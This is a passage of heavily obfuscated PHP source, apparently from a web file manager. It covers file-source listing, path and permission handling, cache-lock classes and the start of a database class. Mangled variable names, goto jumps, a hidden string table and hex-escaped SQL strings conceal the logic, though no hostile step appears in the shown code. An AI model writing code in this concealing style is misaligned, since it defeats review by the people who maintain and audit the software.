is_array($ÄşüÈŠŠ[$É¢„ÁÁ[$—¦íùÚª[411]]]) ? $ÄşüÈŠŠ[$É¢„ÁÁ[$—¦íùÚª[411]]] : $İ«µ‹„Ç; $É¢„ÁÁ[$—¦íùÚª[208]] = $í­¾ê˜¡[$—¦íùÚª[208]]; $É¢„ÁÁ[$—¦íùÚª[207]] = $í­¾ê˜¡[$—¦íùÚª[207]]; unset($É¢„ÁÁ[$—¦íùÚª[421]]); } unset($É¢„ÁÁ); } protected function _listAppendAuth(&$¿á»—ù) { $Ïš‚‰Õã =& $_SERVER[ïëó©ÒÚ]; if (!defined($Ïš‚‰Õã[484])) { return; } $«ïƒÇç¥ = array(); foreach ($¿á»—ù as $Ù‹÷šŸ) { if ($Ù‹÷šŸ[$Ïš‚‰Õã[420]] == self::TYPE_GROUP) { $«ïƒÇç¥[] = $Ù‹÷šŸ[$Ïš‚‰Õã[411]]; } } if (!$«ïƒÇç¥) { return; } $±ÇÓÎ€‘ = array_to_keyvalue($¿á»—ù, $Ïš‚‰Õã[411]); $¢ˆ‚Àš = Model($Ïš‚‰Õã[511])->getSourceList($«ïƒÇç¥, $±ÇÓÎ€‘); $ØÁÂ÷ÖÍ = $GLOBALS[$Ïš‚‰Õã[512]] == 1; foreach ($¿á»—ù as $ÄÔêÌ => &$Ù‹÷šŸ) { $Ù‹÷šŸ[$Ïš‚‰Õã[422]] = $¢ˆ‚Àš[$Ù‹÷šŸ[$Ïš‚‰Õã[411]]]; if (!$Ù‹÷šŸ[$Ïš‚‰Õã[422]] && $Ù‹÷šŸ[$Ïš‚‰Õã[420]] == self::TYPE_GROUP) { $Ù‹÷šŸ[$Ïš‚‰Õã[422]] = Action($Ïš‚‰Õã[513])->pathGroupAuthMake($Ù‹÷šŸ[$Ïš‚‰Õã[514]]); if (!$Ù‹÷šŸ[$Ïš‚‰Õã[422]] && !$ØÁÂ÷ÖÍ) { $Ù‹÷šŸ[$Ïš‚‰Õã[202]] = !1; $Ù‹÷šŸ[$Ïš‚‰Õã[201]] = !1; } } if ($Ù‹÷šŸ[$Ïš‚‰Õã[422]]) { $Ù‹÷šŸ[$Ïš‚‰Õã[202]] = AuthModel::authCheckEdit($Ù‹÷šŸ[$Ïš‚‰Õã[422]][$Ïš‚‰Õã[423]]); $Ù‹÷šŸ[$Ïš‚‰Õã[201]] = AuthModel::authCheckView($Ù‹÷šŸ[$Ïš‚‰Õã[422]][$Ïš‚‰Õã[423]]); } $this->groupPathDisplay($Ù‹÷šŸ); } unset($Ù‹÷šŸ); } public function _listAppendAuthSecret(&$‘ı×Í£È) { $çå‚ï =& $_SERVER[ïëó©ÒÚ]; if (Model($çå‚ï[444])->get($çå‚ï[515]) != $çå‚ï[88]) { return; } static $ã†Õàï = false; if (!$ã†Õàï) { $…ã’ìˆ¥ = Model($çå‚ï[516]); $¼€ñøÉ® = Model($çå‚ï[517]); $ã†Õàï = $¼€ñøÉ®->listData(); $ã†Õàï = array_to_keyvalue($ã†Õàï, $çå‚ï[411]); $˜¡ÄÙ´´ = json_decode(Model($çå‚ï[444])->get($çå‚ï[518]), !0); $˜¡ÄÙ´´ = array_to_keyvalue($˜¡ÄÙ´´, $çå‚ï[399]); foreach ($ã†Õàï as $Æñ—šè => $ôì¯’¿ø) { $±ÓÀØòÄ = $˜¡ÄÙ´´[$ôì¯’¿ø[$çå‚ï[519]]]; if (!$±ÓÀØòÄ) { $¼€ñøÉ®->remove($ôì¯’¿ø[$çå‚ï[399]]); unset($ã†Õàï[$Æñ—šè]); continue; } $š˜éó¤Ü = $…ã’ìˆ¥->listData($±ÓÀØòÄ[$çå‚ï[422]]); if (!$š˜éó¤Ü) { $¼€ñøÉ®->remove($ôì¯’¿ø[$çå‚ï[399]]); unset($ã†Õàï[$Æñ—šè]); continue; } $ôì¯’¿ø[$çå‚ï[422]] = $š˜éó¤Ü; $ôì¯’¿ø[$çå‚ï[520]] = $±ÓÀØòÄ; $ôì¯’¿ø[$çå‚ï[521]] = Model($çå‚ï[522])->getInfoSimpleOuter($ôì¯’¿ø[$çå‚ï[463]]); $ã†Õàï[$Æñ—šè] = $ôì¯’¿ø; } } $áÕ¡âºñ = defined($çå‚ï[523]) ? USER_ID : $çå‚ï[12]; $²±”¼•ù = array(); $•˜©˜½¡ = $this->_listAppendPath($²±”¼•ù, !0); foreach ($‘ı×Í£È as $Æñ—šè => &$ôì¯’¿ø) { if (!is_array($ôì¯’¿ø[$çå‚ï[422]])) { continue; } if ($ôì¯’¿ø[$çå‚ï[420]] != $çå‚ï[524]) { continue; } if (isset($ã†Õàï[$ôì¯’¿ø[$çå‚ï[411]]])) { $ÆÃÇªÌÆ = $ã†Õàï[$ôì¯’¿ø[$çå‚ï[411]]]; if (!is_array($ôì¯’¿ø[$çå‚ï[475]])) { $ôì¯’¿ø[$çå‚ï[475]] = array(); } $ôì¯’¿ø[$çå‚ï[475]][$çå‚ï[525]] = $ÆÃÇªÌÆ[$çå‚ï[519]]; $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[526]] = $ÆÃÇªÌÆ; $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[527]] = $ôì¯’¿ø[$çå‚ï[528]]; $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[529]] = $çå‚ï[88]; if ($ÆÃÇªÌÆ[$çå‚ï[463]] != $áÕ¡âºñ) { $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[423]] = $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[423]] & $ÆÃÇªÌÆ[$çå‚ï[422]][$çå‚ï[422]]; } continue; } $ÄçÒ©Ìü = $this->parentLevelArray($ôì¯’¿ø[$çå‚ï[530]]); $¸Ñı‚‰§ = array_reverse($ÄçÒ©Ìü); foreach ($¸Ñı‚‰§ as $ğ“ş­òä => $á€šÕ³Ò) { if (!isset($ã†Õàï[$á€šÕ³Ò])) { continue; } $ÆÃÇªÌÆ = $ã†Õàï[$á€šÕ³Ò]; $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[526]] = $ÆÃÇªÌÆ; if ($ÆÃÇªÌÆ[$çå‚ï[463]] != $áÕ¡âºñ) { $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[423]] = $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[423]] & $ÆÃÇªÌÆ[$çå‚ï[422]][$çå‚ï[422]]; } $ó›©Ø´˜ = $çå‚ï[12]; $ûª°“ ı = count($ÄçÒ©Ìü) - $ğ“ş­òä; for ($âäß¹ó° = 0; $âäß¹ó° < $ûª°“ ı; $âäß¹ó°++) { if (!isset($•˜©˜½¡[$ÄçÒ©Ìü[$âäß¹ó°]])) { $ó›©Ø´˜ = $çå‚ï[12]; break; } $ó›©Ø´˜ = $ó›©Ø´˜ . rtrim($•˜©˜½¡[$ÄçÒ©Ìü[$âäß¹ó°]], $çå‚ï[8]) . $çå‚ï[8]; } $ôì¯’¿ø[$çå‚ï[422]][$çå‚ï[527]] = rtrim($ó›©Ø´˜, $çå‚ï[8]) . $çå‚ï[8]; break; } } unset($ôì¯’¿ø); } public function groupPathDisplay(&$šÙ¾ö·¥) { $ª¯÷­¯½ =& $_SERVER[ïëó©ÒÚ]; if ($šÙ¾ö·¥[$ª¯÷­¯½[420]] != self::TYPE_GROUP) { return; } $¸î“¯ÇÊ = Model($ª¯÷­¯½[531])->getInfo($šÙ¾ö·¥[$ª¯÷­¯½[514]]); $Ç•„Ù“ = $this->parentLevelArray($¸î“¯ÇÊ[$ª¯÷­¯½[530]]); $êÜÖ¦´ = $ª¯÷­¯½[12]; foreach ($Ç•„Ù“ as $¶Œ´’’ª) { $ÆâÛ¦–Ø = Model($ª¯÷­¯½[531])->getInfo($¶Œ´’’ª); $êÜÖ¦´ .= $ÆâÛ¦–Ø[$ª¯÷­¯½[86]][$ª¯÷­¯½[411]] . $ª¯÷­¯½[50]; } $šÙ¾ö·¥[$ª¯÷­¯½[532]] = $¸î“¯ÇÊ[$ª¯÷­¯½[441]]; $šÙ¾ö·¥[$ª¯÷­¯½[533]] = $¸î“¯ÇÊ[$ª¯÷­¯½[530]]; $šÙ¾ö·¥[$ª¯÷­¯½[534]] = $¸î“¯ÇÊ[$ª¯÷­¯½[535]]; $šÙ¾ö·¥[$ª¯÷­¯½[536]] = $êÜÖ¦´ . $¸î“¯ÇÊ[$ª¯÷­¯½[86]][$ª¯÷­¯½[411]]; } protected function _listAppendPath(&$ì›ùñå‰, $À”ğÅÇ¼ = false) { $„„æëà =& $_SERVER[ïëó©ÒÚ]; static $Éğ¥÷¶È = array(); $áÚ‰‡§Ñ = array(); $£¬¶”É¿ = array(); if ($À”ğÅÇ¼) { return $Éğ¥÷¶È; } foreach ($ì›ùñå‰ as &$‹Æ¿ş…) { $€öï³¢‘ = $‹Æ¿ş…[$„„æëà[411]]; if ($‹Æ¿ş…[$„„æëà[419]] == $„„æëà[88] && $‹Æ¿ş…[$„„æëà[441]] != 0) { $Éğ¥÷¶È[$€öï³¢‘] = $‹Æ¿ş…[$„„æëà[32]]; } if ($‹Æ¿ş…[$„„æëà[419]] == $„„æëà[88] && $‹Æ¿ş…[$„„æëà[441]] == 0 && !isset($Éğ¥÷¶È[$€öï³¢‘])) { $Éğ¥÷¶È[$€öï³¢‘] = $this->_listAppendPathRoot($‹Æ¿ş…, array()); } if (isset($£¬¶”É¿[$‹Æ¿ş…[$„„æëà[530]]])) { continue; } $£¬¶”É¿[$‹Æ¿ş…[$„„æëà[530]]] = !0; $¿¯èÛ” = $this->parentLevelArray($‹Æ¿ş…[$„„æëà[530]]); foreach ($¿¯èÛ” as $ıêÚÙïÍ => $Ï¥°Ú“æ) { if (isset($Éğ¥÷¶È[$Ï¥°Ú“æ])) { continue; } if ($ıêÚÙïÍ == 0) { $Éğ¥÷¶È[$Ï¥°Ú“æ] = $this->_listAppendPathRoot($‹Æ¿ş…, $¿¯èÛ”); } if ($ıêÚÙïÍ != 0) { $áÚ‰‡§Ñ[] = $Ï¥°Ú“æ; } } } unset($‹Æ¿ş…); $áÚ‰‡§Ñ = array_unique($áÚ‰‡§Ñ); if (count($áÚ‰‡§Ñ) > 0) { $úÒéÑ• = array($„„æëà[426] => array($„„æëà[427], $áÚ‰‡§Ñ)); if (count($áÚ‰‡§Ñ) == 1) { $ÍƒµĞ‡… = $this->sourceInfo($áÚ‰‡§Ñ[0]); $‡Ğş”¤Ë = is_array($ÍƒµĞ‡…) ? array($ÍƒµĞ‡…) : !1; } else { $‡Ğş”¤Ë = $this->field($„„æëà[537])->where($úÒéÑ•)->select(); } if (!$‡Ğş”¤Ë) { $‡Ğş”¤Ë = array(); } foreach ($‡Ğş”¤Ë as $à×İØ»ø) { $Éğ¥÷¶È[$à×İØ»ø[$„„æëà[411]]] = $à×İØ»ø[$„„æëà[32]]; } } $ïÙ•¸® = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $î’Ã¦š = array(); foreach ($ì›ùñå‰ as &$‹Æ¿ş…) { $¤õÕâÃ¼ = $‹Æ¿ş…[$„„æëà[530]]; $÷ Å­ = $„„æëà[12]; if (isset($î’Ã¦š[$¤õÕâÃ¼])) { $÷ Å­ = $î’Ã¦š[$¤õÕâÃ¼]; } else { $¿¯èÛ” = $this->parentLevelArray($‹Æ¿ş…[$„„æëà[530]]); foreach ($¿¯èÛ” as $ıêÚÙïÍ => $Ï¥°Ú“æ) { if (isset($Éğ¥÷¶È[$Ï¥°Ú“æ])) { $÷ Å­ .= $Éğ¥÷¶È[$Ï¥°Ú“æ] . $„„æëà[8]; } } $î’Ã¦š[$¤õÕâÃ¼] = $÷ Å­; } $÷ Å­ .= $‹Æ¿ş…[$„„æëà[32]]; if ($‹Æ¿ş…[$„„æëà[419]] == $„„æëà[88]) { $÷ Å­ .= $„„æëà[8]; } $‹Æ¿ş…[$„„æëà[528]] = str_replace($„„æëà[538], $„„æëà[8], $÷ Å­); if ($‹Æ¿ş…[$„„æëà[441]] == $„„æëà[197]) { $‹Æ¿ş…[$„„æëà[32]] = trim($Éğ¥÷¶È[$‹Æ¿ş…[$„„æëà[411]]], $„„æëà[8]); $‹Æ¿ş…[$„„æëà[528]] = $‹Æ¿ş…[$„„æëà[32]] . $„„æëà[8]; } if (intval($‹Æ¿ş…[$„„æëà[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‹Æ¿ş…, $¿¯èÛ”, $ïÙ•¸®); } } unset($‹Æ¿ş…); return $ì›ùñå‰; } private function _listAppendPathRecycle(&$¹ÂöïÂ½, $Éíé¿ô†, $ëğØ¸Œ) { $úê§»ãÑ =& $_SERVER[ïëó©ÒÚ]; if (!in_array($ëğØ¸Œ, $Éíé¿ô†) && $¹ÂöïÂ½[$úê§»ãÑ[411]] != $ëğØ¸Œ) { return; } $Ô¦†–“Ò = explode($úê§»ãÑ[8], trim($¹ÂöïÂ½[$úê§»ãÑ[528]], $úê§»ãÑ[8])); $€Ã‰‰¢Ä = implode($úê§»ãÑ[8], array_slice($Ô¦†–“Ò, 2)); $¹ÂöïÂ½[$úê§»ãÑ[528]] = $úê§»ãÑ[8] . LNG($úê§»ãÑ[539]) . $úê§»ãÑ[8] . ltrim($€Ã‰‰¢Ä, $úê§»ãÑ[8]); $¹ÂöïÂ½[$úê§»ãÑ[530]] = $úê§»ãÑ[540] . implode($úê§»ãÑ[50], array_slice($Éíé¿ô†, 1)) . $úê§»ãÑ[50]; if ($¹ÂöïÂ½[$úê§»ãÑ[411]] == $ëğØ¸Œ) { $¹ÂöïÂ½[$úê§»ãÑ[530]] = $úê§»ãÑ[540]; $¹ÂöïÂ½[$úê§»ãÑ[441]] = $úê§»ãÑ[197]; $¹ÂöïÂ½[$úê§»ãÑ[32]] = LNG($úê§»ãÑ[539]); } $¹ÂöïÂ½[$úê§»ãÑ[541]] = $úê§»ãÑ[542]; } protected function _listAppendPathRoot(&$¦şü²Î, $×±İµàÓ) { $“Ò›ûË =& $_SERVER[ïëó©ÒÚ]; static $ä¬¢¶ò = false; $‹ ØÃÈ = $“Ò›ûË[12]; if ($¦şü²Î[$“Ò›ûË[420]] == self::TYPE_USER) { if (defined($“Ò›ûË[484]) && $¦şü²Î[$“Ò›ûË[514]] == USER_ID) { $‹ ØÃÈ = LNG($“Ò›ûË[543]); if ($ä¬¢¶ò === !1) { $Š×ç¾Š– = Model($“Ò›ûË[544])->getInfoFull(USER_ID); $ä¬¢¶ò = _get($Š×ç¾Š–, $“Ò›ûË[545], $“Ò›ûË[12]); } if ($×±İµàÓ && $×±İµàÓ[0] == $ä¬¢¶ò || !$×±İµàÓ && $¦şü²Î[$“Ò›ûË[411]] == $ä¬¢¶ò) { $‹ ØÃÈ = LNG($“Ò›ûË[546]); $¦şü²Î[$“Ò›ûË[547]] = $“Ò›ûË[548]; } if (!$×±İµàÓ) { $¦şü²Î[$“Ò›ûË[32]] = $‹ ØÃÈ; } } else { $îùÀô˜ = Model($“Ò›ûË[522])->getInfoSimple($¦şü²Î[$“Ò›ûË[514]]); $‹ ØÃÈ = LNG($“Ò›ûË[549]) . $“Ò›ûË[162] . $îùÀô˜[$“Ò›ûË[32]] . $“Ò›ûË[164]; $¦şü²Î[$“Ò›ûË[550]] = array($“Ò›ûË[32] => $îùÀô˜[$“Ò›ûË[32]], $“Ò›ûË[551] => $îùÀô˜[$“Ò›ûË[551]], $“Ò›ûË[552] => $îùÀô˜[$“Ò›ûË[552]]); } } else { if ($¦şü²Î[$“Ò›ûË[420]] == self::TYPE_GROUP) { $îùÀô˜ = Model($“Ò›ûË[531])->getInfoSimple($¦şü²Î[$“Ò›ûË[514]]); $‹ ØÃÈ = $îùÀô˜[$“Ò›ûË[32]]; } else { if ($¦şü²Î[$“Ò›ûË[420]] == self::TYPE_SYSTEM) { $‹ ØÃÈ = $“Ò›ûË[553]; } } } $‹ ØÃÈ = $‹ ØÃÈ ? $“Ò›ûË[8] . $‹ ØÃÈ . $“Ò›ûË[8] : $“Ò›ûË[8]; return $‹ ØÃÈ; } protected function _listAppendUser(&$ğ¦°¾³Ê) { $ ìß—Íú =& $_SERVER[ïëó©ÒÚ]; $¥¹æà· = array_to_keyvalue($ğ¦°¾³Ê, $ ìß—Íú[12], $ ìß—Íú[463]); $—à¬Èêş = array_to_keyvalue($ğ¦°¾³Ê, $ ìß—Íú[12], $ ìß—Íú[465]); $Ï¸ß—”Ú = array_merge($¥¹æà·, $—à¬Èêş); $·ì§ë¯ñ = Model($ ìß—Íú[544])->userListInfo($Ï¸ß—”Ú); foreach ($ğ¦°¾³Ê as &$Ö²×‹Ö†) { $¹¤ŸŠÓ = $Ö²×‹Ö†[$ ìß—Íú[463]]; $Ö²×‹Ö†[$ ìß—Íú[463]] = $·ì§ë¯ñ[$¹¤ŸŠÓ] ? $·ì§ë¯ñ[$¹¤ŸŠÓ] : !1; $¹¤ŸŠÓ = $Ö²×‹Ö†[$ ìß—Íú[465]]; $Ö²×‹Ö†[$ ìß—Íú[465]] = $·ì§ë¯ñ[$¹¤ŸŠÓ] ? $·ì§ë¯ñ[$¹¤ŸŠÓ] : !1; if (isset($Ö²×‹Ö†[$ ìß—Íú[475]]) && $Ö²×‹Ö†[$ ìß—Íú[475]][$ ìß—Íú[554]]) { $ëğ×–è = $GLOBALS[$ ìß—Íú[6]][$ ìß—Íú[89]][$ ìß—Íú[555]]; if ($Ö²×‹Ö†[$ ìß—Íú[475]][$ ìß—Íú[556]] <= time() - $ëğ×–è) { $this->metaSet($Ö²×‹Ö†[$ ìß—Íú[411]], $ ìß—Íú[554], null); $this->metaSet($Ö²×‹Ö†[$ ìß—Íú[411]], $ ìß—Íú[556], null); unset($Ö²×‹Ö†[$ ìß—Íú[475]][$ ìß—Íú[554]]); continue; } $ôàÂ‘ = $Ö²×‹Ö†[$ ìß—Íú[475]][$ ìß—Íú[554]]; $Ö²×‹Ö†[$ ìß—Íú[475]][$ ìß—Íú[557]] = Model($ ìß—Íú[544])->getInfoSimpleOuter($ôàÂ‘); } } unset($Ö²×‹Ö†); } public function parentLevelArray($®¼‹²Ã) { $ÕÕ›òÌÍ =& $_SERVER[ïëó©ÒÚ]; $®¼‹²Ã = explode($ÕÕ›òÌÍ[50], trim($®¼‹²Ã, $ÕÕ›òÌÍ[50])); return array_remove_value($®¼‹²Ã, $ÕÕ›òÌÍ[197]); } public function listAll($ÛšÂªŠ) { $Œ–µıà =& $_SERVER[ïëó©ÒÚ]; $ƒÇûÎ“  = $this->sourceInfo($ÛšÂªŠ); $‹’‚úÌó = array($Œ–µıà[558] => array($Œ–µıà[559], $ƒÇûÎ“ [$Œ–µıà[530]] . $ÛšÂªŠ . $Œ–µıà[560]), $Œ–µıà[561] => 0); $¸œœÜ Á = $Œ–µıà[562]; $«Ë¢¦ßŞ = "\114\x45\x46\x54\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\x66\x69\154\145\40\146\151\x6c\x65\x20\157\156\40\x73\x6f\165\162\143\x65\x2e\146\x69\x6c\x65\111\x44\40\x3d\40\146\x69\x6c\x65\x2e\146\151\x6c\145\x49\x44"; $‰„éÚ“ç = $this->alias($Œ–µıà[455])->field($¸œœÜ Á)->where($‹’‚úÌó)->join($«Ë¢¦ßŞ)->select(); $this->_listAppendAuth($‰„éÚ“ç); $this->_listAppendUser($‰„éÚ“ç); $this->_listAppendPath($‰„éÚ“ç); $‰„éÚ“ç = array_to_keyvalue($‰„éÚ“ç, $Œ–µıà[411]); $‘®Çıó = "\57{$ƒÇûÎ“ [$Œ–µıà[32]]}\x2f"; $‘®Çıó = $‘®Çıó == $Œ–µıà[538] ? $Œ–µıà[8] : $‘®Çıó; $Ë¤ê»ßØ = array(); foreach ($‰„éÚ“ç as $¿ş¾¹ÙŠ => $œàüÅ—•) { $’ëŞÆ‰æ = $this->parentLevelArray($œàüÅ—•[$Œ–µıà[530]]); array_shift($’ëŞÆ‰æ); $±ÆºÏíş = $‘®Çıó; for ($®Æ••‡Õ = 0; $®Æ••‡Õ < count($’ëŞÆ‰æ); $®Æ••‡Õ++) { $±ÆºÏíş .= $‰„éÚ“ç[$’ëŞÆ‰æ[$®Æ••‡Õ]][$Œ–µıà[32]] . $Œ–µıà[8]; } $±ÆºÏíş .= $œàüÅ—•[$Œ–µıà[32]]; if ($œàüÅ—•[$Œ–µıà[419]]) { $±ÆºÏíş .= $Œ–µıà[8]; } $±ÆºÏíş = str_replace($Œ–µıà[538], $Œ–µıà[8], $±ÆºÏíş); $±ÆºÏíş = str_replace($Œ–µıà[538], $Œ–µıà[8], $±ÆºÏíş); $šÈåÀï = array($Œ–µıà[430] => str_replace($Œ–µıà[538], $Œ–µıà[8], $±ÆºÏíş), $Œ–µıà[563] => intval($œàüÅ—•[$Œ–µıà[419]]), $Œ–µıà[86] => $this->pathInfoFilter($œàüÅ—•)); if (!$œàüÅ—•[$Œ–µıà[419]]) { $šÈåÀï[$Œ–µıà[477]] = $œàüÅ—•[$Œ–µıà[477]]; $šÈåÀï[$Œ–µıà[87]] = $œàüÅ—•[$Œ–µıà[84]]; } $Ë¤ê»ßØ[] = $šÈåÀï; } return $Ë¤ê»ßØ; } } goto eÖ©¤¬Œ¸; EÜâ¬íğÃ¦: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $æ×ÏÃµó =& $_SERVER[ïëó©ÒÚ]; $§é®Ç—ó = $GLOBALS[$æ×ÏÃµó[6]][$æ×ÏÃµó[349]]; self::$cachePath = $§é®Ç—ó[$æ×ÏÃµó[199]][$æ×ÏÃµó[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ë±Ç½¿ , $âİºä¥ = 0) { $ĞŸä„î‘ =& $_SERVER[ïëó©ÒÚ]; $ãò“ëİ¾ = microtime(!0); $Æ»¢«é = $ãò“ëİ¾ + $âİºä¥ + 0.0001; $ÀÅƒèìƒ = rtrim(self::$cachePath, $ĞŸä„î‘[8]) . $ĞŸä„î‘[869] . md5($ë±Ç½¿ ) . $ĞŸä„î‘[866]; if (file_exists($ÀÅƒèìƒ) && filemtime($ÀÅƒèìƒ) && filemtime($ÀÅƒèìƒ) < time() - 10) { @unlink($ÀÅƒèìƒ); } do { if (file_exists($ÀÅƒèìƒ)) { cacheLockWait(); continue; } $È´¯†‚Ê = fopen($ÀÅƒèìƒ, $ĞŸä„î‘[870]); if (!$È´¯†‚Ê) { return !1; } $¿êôñõ¾ = flock($È´¯†‚Ê, LOCK_EX | LOCK_NB); self::$caches[$ë±Ç½¿ ] = array($ĞŸä„î‘[871] => $È´¯†‚Ê, $ĞŸä„î‘[199] => $ÀÅƒèìƒ); fwrite($È´¯†‚Ê, $Æ»¢«é); clearstatcache(); if ($È´¯†‚Ê && $¿êôñõ¾) { return !0; } cacheLockWait(); } while (microtime(!0) < $Æ»¢«é); $this->unlock($ë±Ç½¿ ); return !1; } public function lockGet($Åö›­Ø‹) { $ÔğØ€¬ =& $_SERVER[ïëó©ÒÚ]; $©ŒŠ­·œ = rtrim(self::$cachePath, $ÔğØ€¬[8]) . $ÔğØ€¬[869] . md5($Åö›­Ø‹) . $ÔğØ€¬[866]; return file_exists($©ŒŠ­·œ); } public function unlock($Œ½óõ˜) { $¹©Í‡¶Å =& $_SERVER[ïëó©ÒÚ]; $õüµ©ñµ = self::$caches[$Œ½óõ˜]; if (!$õüµ©ñµ) { return; } @flock($õüµ©ñµ[$¹©Í‡¶Å[871]], LOCK_UN); @fclose($õüµ©ñµ[$¹©Í‡¶Å[871]]); @unlink($õüµ©ñµ[$¹©Í‡¶Å[199]]); unset(self::$caches[$Œ½óõ˜]); } } class CacheLockRedis { public function lock($ÏïÃÔÁ°, $¢»×²ÅÄ = 10) { $Æ««ïŒô = Cache::init(); $á‡¬ë¢ = microtime(!0) + $¢»×²ÅÄ; while (microtime(!0) < $á‡¬ë¢) { $ë³Ô¹•× = $Æ««ïŒô->get($ÏïÃÔÁ°); if (!$ë³Ô¹•×) { $±Ùë¢ª´ = $Æ««ïŒô->setLock($ÏïÃÔÁ°, $á‡¬ë¢, $¢»×²ÅÄ); if ($±Ùë¢ª´) { return !0; } } else { if ($ë³Ô¹•× < microtime(!0)) { $Æ««ïŒô->set($ÏïÃÔÁ°, $á‡¬ë¢, $¢»×²ÅÄ * 2); if ($Æ««ïŒô->get($ÏïÃÔÁ°) === $ë³Ô¹•×) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÈüÕÔä±) { return Cache::init()->get($ÈüÕÔä±); } public function unlock($…¤ªìÌò) { return Cache::init()->remove($…¤ªìÌò); } } class CacheLockMemcached { public function lock($¢è’æ…¸, $Ô¶¦ŠÆÇ = 0) { $ù¤’±Ê¿ = Cache::init(); $È•àó»‹ = microtime(!0) + $Ô¶¦ŠÆÇ; while (microtime(!0) < $È•àó»‹) { $â¦©Ë¾‰ = $ù¤’±Ê¿->get($¢è’æ…¸); if (!$â¦©Ë¾‰ || $â¦©Ë¾‰ < microtime(!0)) { $†ğ®´Ê = $ù¤’±Ê¿->handle->add($¢è’æ…¸, $È•àó»‹, $Ô¶¦ŠÆÇ); if ($†ğ®´Ê) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ù±¾¶Ò) { return Cache::init()->get($Ù±¾¶Ò); } public function unlock($Ğ½òÏàÕ) { return Cache::init()->remove($Ğ½òÏàÕ); } } goto b¨¤Ã´ëÅ¸; AÍ¤­âÉ›‰: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\161" => "\x3c\76", "\147\164" => "\76", "\145\x67\x74" => "\76\75", "\154\x74" => "\74", "\145\x6c\x74" => "\74\75", "\x6e\x6f\x74\154\151\153\145" => "\x4e\117\124\x20\114\111\113\105", "\x6c\x69\153\145" => "\114\x49\113\x45", "\x69\x6e" => "\x49\116", "\156\157\164\x69\x6e" => "\116\117\x54\40\x49\116", "\156\x6f\164\40\x69\156" => "\116\x4f\124\40\111\x4e", "\x62\145\x74\x77\145\x65\x6e" => "\x42\105\x54\127\x45\x45\x4e", "\x6e\157\164\x62\x65\x74\x77\x65\145\x6e" => "\116\117\x54\x20\x42\x45\124\x57\105\x45\116", "\x6e\157\164\x20\x62\x65\164\x77\x65\x65\x6e" => "\x4e\x4f\x54\x20\x42\105\124\127\x45\105\x4e"); protected $selectSql = "\x53\105\x4c\x45\103\124\45\104\111\x53\x54\111\116\103\124\45\x20\45\x46\x49\105\114\x44\x25\x20\106\x52\x4f\115\x20\45\x54\101\102\x4c\x45\x25\45\x4a\117\x49\x4e\45\x25\x57\x48\105\122\105\45\45\x47\x52\x4f\125\120\x25\x25\x48\101\126\x49\x4e\x47\45\45\117\122\104\x45\122\x25\45\x4c\111\115\x49\x54\45\x20\45\x55\x4e\x49\117\x4e\45\45\103\117\x4d\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $ş½¸‘¢¤ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ïëó©ÒÚ][963], $ş½¸‘¢¤); } public function factory($–‡ØÌö = '') { $š¿ŸĞİÜ =& $_SERVER[ïëó©ÒÚ]; $–‡ØÌö = $this->parseConfig($–‡ØÌö); if (empty($–‡ØÌö[$š¿ŸĞİÜ[964]])) { think_exception(think_lang($š¿ŸĞİÜ[965])); } $this->dbType = ucwords(strtolower($–‡ØÌö[$š¿ŸĞİÜ[964]])); $Œ§î²Ìû = $š¿ŸĞİÜ[966] . $this->dbType; if (class_exists($Œ§î²Ìû)) { $ŸÎ÷Ÿêá = new $Œ§î²Ìû($–‡ØÌö); if ($š¿ŸĞİÜ[967] != strtolower($–‡ØÌö[$š¿ŸĞİÜ[964]])) { $ŸÎ÷Ÿêá->dbType = strtoupper($this->dbType); } else { $ŸÎ÷Ÿêá->dbType = $this->_getDsnType($–‡ØÌö[$š¿ŸĞİÜ[919]]); } } else { think_exception(think_lang($š¿ŸĞİÜ[968]) . $š¿ŸĞİÜ[969] . $Œ§î²Ìû); } return $ŸÎ÷Ÿêá; } public function __call($‹‰ÎõË, $’˜†½ùë) { if (method_exists($this, $‹‰ÎõË)) { return call_user_func_array(array($this, $‹‰ÎõË), $’˜†½ùë); } } protected function _getDsnType($Å¨àËƒ‚) { $‡£ó ™² = explode($_SERVER[ïëó©ÒÚ][4], $Å¨àËƒ‚); $Ù™Ùİ«Ş = strtoupper(trim($‡£ó ™²[0])); return $Ù™Ùİ«Ş; } private function parseConfig($öä¡’Éü = '') { $µÛ×æ™Ô =& $_SERVER[ïëó©ÒÚ]; if (!empty($öä¡’Éü) && is_string($öä¡’Éü)) { $öä¡’Éü = $this->parseDSN($öä¡’Éü); } elseif (is_array($öä¡’Éü)) { $öä¡’Éü = array_change_key_case($öä¡’Éü); $öä¡’Éü = array($µÛ×æ™Ô[964] => $öä¡’Éü[$µÛ×æ™Ô[970]], $µÛ×æ™Ô[891] => $öä¡’Éü[$µÛ×æ™Ô[971]], $µÛ×æ™Ô[892] => $öä¡’Éü[$µÛ×æ™Ô[972]], $µÛ×æ™Ô[889] => $öä¡’Éü[$µÛ×æ™Ô[973]], $µÛ×æ™Ô[890] => $öä¡’Éü[$µÛ×æ™Ô[974]], $µÛ×æ™Ô[21] => $öä¡’Éü[$µÛ×æ™Ô[975]], $µÛ×æ™Ô[919] => $öä¡’Éü[$µÛ×æ™Ô[976]], $µÛ×æ™Ô[17] => isset($öä¡’Éü[$µÛ×æ™Ô[977]]) 